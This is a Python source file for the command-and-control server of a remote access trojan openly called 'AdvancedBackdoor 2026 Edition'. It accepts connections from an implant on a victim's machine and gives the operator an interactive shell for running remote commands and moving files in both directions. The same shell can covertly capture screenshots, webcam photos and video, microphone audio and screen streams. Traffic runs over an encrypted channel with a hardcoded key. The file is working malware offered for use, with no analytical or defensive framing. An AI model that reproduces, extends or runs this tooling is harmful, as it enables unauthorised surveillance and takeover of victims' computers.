#!/usr/bin/env python3
"""
server.py - CLI Control Server for AdvancedBackdoor 2026 Edition
Run on your Linux/Windows machine.  For a GUI use gui_server.py.
"""

import socket
import json
import sys
import os
import base64
import threading
import time

DEFAULT_PORT = 5555
BUFFER_SIZE = 4096

# ─── Encrypted channel (must match client.py) ────────────────────────────────
_SHARED_KEY = b'BackdoorKey2026!AdvancedSecurity'   # exactly 32 bytes
try:
    from cryptography.fernet import Fernet as _Fernet
    _cipher = _Fernet(base64.urlsafe_b64encode(_SHARED_KEY))
    ENCRYPTED = True
except ImportError:
    _cipher = None
    ENCRYPTED = False
# ─────────────────────────────────────────────────────────────────────────────


def reliable_send(conn, data):
    try:
        payload = json.dumps(data).encode()
        if ENCRYPTED and _cipher:
            token = _cipher.encrypt(payload)
            payload = json.dumps({"e": token.decode()}).encode()
        conn.sendall(payload)
    except Exception as e:
        print(f"[-] Send error: {e}")


def reliable_recv(conn):
    buf = ""
    while True:
        try:
            chunk = conn.recv(BUFFER_SIZE).decode("utf-8", errors="replace")
            buf += chunk
            if not chunk:
                return None
            parsed = json.loads(buf)
            if (ENCRYPTED and _cipher
                    and isinstance(parsed, dict) and "e" in parsed):
                clear = _cipher.decrypt(parsed["e"].encode())
                return json.loads(clear.decode())
            return parsed
        except ValueError:
            continue
        except Exception as e:
            print(f"[-] Recv error: {e}")
            return None


def recv_file(conn, file_name):
    """Receive raw base64 bytes ending with <END>, decode and save."""
    print(f"[*] Receiving '{file_name}'...")
    raw = b""
    while True:
        chunk = conn.recv(BUFFER_SIZE)
        if b"<END>" in chunk:
            raw += chunk.replace(b"<END>", b"")
            break
        raw += chunk
    try:
        decoded = base64.b64decode(raw)
        with open(file_name, "wb") as f:
            f.write(decoded)
        print(f"[+] Saved '{file_name}' ({len(decoded):,} bytes)")
    except Exception as e:
        print(f"[-] Failed to save file: {e}")


def send_file(conn, file_name):
    """Send a local file as raw base64 bytes followed by <END>."""
    try:
        with open(file_name, "rb") as f:
            data = f.read()
        conn.sendall(base64.b64encode(data))
        time.sleep(0.3)
        conn.sendall(b"<END>")
        print(f"[+] Sent '{file_name}' ({len(data):,} bytes)")
    except FileNotFoundError:
        print(f"[-] File '{file_name}' not found locally")
        reliable_send(conn, f"[ERROR] File '{file_name}' not found")
    except Exception as e:
        print(f"[-] Send file error: {e}")


def shell_loop(conn, addr):
    print(f"\n[+] Connection from {addr[0]}:{addr[1]}"
          f"  (encrypted={ENCRYPTED})")
    print("[+] Type 'help' for commands, 'quit' to exit.\n")

    while True:
        try:
            cmd = input(f"backdoor[{addr[0]}]> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[!] Exiting...")
            reliable_send(conn, "quit")
            break

        if not cmd:
            continue

        # ── download <file> — pull file FROM client ───────────────────────────
        if cmd.startswith("download "):
            file_name = cmd[9:].strip()
            reliable_send(conn, cmd)
            msg = reliable_recv(conn)      # "[UPLOAD]..." or "[ERROR]..."
            if msg:
                print(str(msg))
            if msg and "[UPLOAD]" in str(msg):
                recv_file(conn, file_name)
            continue

        # ── upload <file> — push file TO client ───────────────────────────────
        if cmd.startswith("upload "):
            file_name = cmd[7:].strip()
            if not os.path.exists(file_name):
                print(f"[-] Local file '{file_name}' not found")
                continue
            reliable_send(conn, cmd)
            ready = reliable_recv(conn)    # "[*] Ready to receive..."
            if ready:
                print(str(ready))
            send_file(conn, file_name)
            result = reliable_recv(conn)   # "[DOWNLOAD] File saved..."
            if result:
                print(str(result))
            continue

        # ── screenshot ────────────────────────────────────────────────────────
        if cmd == "screenshot":
            reliable_send(conn, cmd)
            status = reliable_recv(conn)
            if status:
                print(str(status))
            if status and "[+]" in str(status):
                up = reliable_recv(conn)
                if up:
                    print(str(up))
                recv_file(conn, f"screenshot_{int(time.time())}.png")
            continue

        # ── webcam ────────────────────────────────────────────────────────────
        if cmd == "webcam":
            reliable_send(conn, cmd)
            status = reliable_recv(conn)
            if status:
                print(str(status))
            if status and "[+]" in str(status):
                up = reliable_recv(conn)
                if up:
                    print(str(up))
                recv_file(conn, f"webcam_{int(time.time())}.jpg")
            continue

        # ── webcam_video ──────────────────────────────────────────────────────
        if cmd.startswith("webcam_video"):
            reliable_send(conn, cmd)
            rec = reliable_recv(conn)
            if rec:
                print(str(rec))
            done = reliable_recv(conn)
            if done:
                print(str(done))
            if done and "[+]" in str(done):
                up = reliable_recv(conn)
                if up:
                    print(str(up))
                recv_file(conn, f"webcam_video_{int(time.time())}.avi")
            continue

        # ── audio_record ──────────────────────────────────────────────────────
        if cmd.startswith("audio_record"):
            reliable_send(conn, cmd)
            rec = reliable_recv(conn)
            if rec:
                print(str(rec))
            done = reliable_recv(conn)
            if done:
                print(str(done))
            if done and "[+]" in str(done):
                up = reliable_recv(conn)
                if up:
                    print(str(up))
                recv_file(conn, f"audio_{int(time.time())}.wav")
            continue

        # ── screen_stream ─────────────────────────────────────────────────────
        if cmd.startswith("screen_stream"):
            parts = cmd.split()
            count = 5
            if len(parts) > 1:
                try:
                    count = int(parts[1])
                except Exception:
                    pass
            reliable_send(conn, cmd)
            init = reliable_recv(conn)
            if init:
                print(str(init))
            for i in range(count):
                frame_msg = reliable_recv(conn)
                if frame_msg:
                    print(str(frame_msg))
                if (frame_msg and "[STREAM]" in str(frame_msg)
                        and "failed" not in str(frame_msg).lower()):
                    up = reliable_recv(conn)
                    if up:
                        print(str(up))
                    recv_file(conn, f"stream_{int(time.time())}_{i + 1:02d}.png")
            end = reliable_recv(conn)
            if end:
                print(str(end))
            continue

        # ── quit ──────────────────────────────────────────────────────────────
        reliable_send(conn, cmd)
        if cmd == "quit":
            break

        # ── generic command ───────────────────────────────────────────────────
        response = reliable_recv(conn)
        if response:
            print(str(response))
        else:
            print("[-] No response or connection lost")
            break


def start_server(host="0.0.0.0", port=DEFAULT_PORT):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((host, port))
        server.listen(5)
        print(f"[*] Server on {host}:{port}  (encrypted={ENCRYPTED})")
        print("[*] Waiting for connections...\n")
        while True:
            conn, addr = server.accept()
            t = threading.Thread(target=shell_loop, args=(conn, addr),
                                  daemon=True)
            t.start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down.")
    except Exception as e:
        print(f"[-] Server error: {e}")
    finally:
        server.close()


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "0.0.0.0"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    start_server(host, port)
